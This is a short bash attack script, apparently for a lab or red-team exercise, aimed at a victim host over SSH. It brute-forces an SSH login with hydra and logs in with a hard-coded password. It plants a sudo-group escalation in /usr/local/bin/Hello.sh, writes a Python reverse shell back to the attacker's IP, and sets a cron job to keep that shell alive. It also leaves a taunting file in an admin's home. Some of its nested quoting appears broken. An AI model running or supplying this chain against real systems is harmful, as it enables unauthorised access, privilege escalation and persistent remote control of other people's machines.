#Install sshpass for attack
sudo apt-get update
sudo apt-get install -y sshpass

#Get attacker ip
read -p "What is the attacker IP:" attacker_ip

#Get victim ip
read -p "What is the victim IP:" victim_ip

#Brute Force SSH for user1
hydra -l user1 -P /usr/share/wordlists/john.lst -t 6 ssh://$victim_ip
sudo sshpass -p "password1" ssh -o StrictHostKeyChecking=no "user1@${victim_ip}" 'echo "sudo usermod -aG sudo user1" >> /usr/local/bin/Hello.sh"'

#Wait 6 seconds for user to be created
sleep 6

#Create python rev shell file
sudo sshpass -p "password1" ssh -o StrictHostKeyChecking=no "user1@${victim_ip}" 'echo "export RHOST=${attacker_ip};export RPORT=6969;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'" > /home/user1/sus.py; echo "*/5 * * * * /usr/bin/python3 /home/user1/sus.py" | sudo crontab -; echo "I am in, you cannot find me" > /home/admin1/donttouch.txt'

#Add rev shell to crontab
#echo "*/5 * * * * /usr/bin/python3 /home/user1/sus.py" | sudo crontab -


#Adds text to admins donttouch.txt
#echo "I am in, you cannot find me" > /home/admin1/donttouch.txt

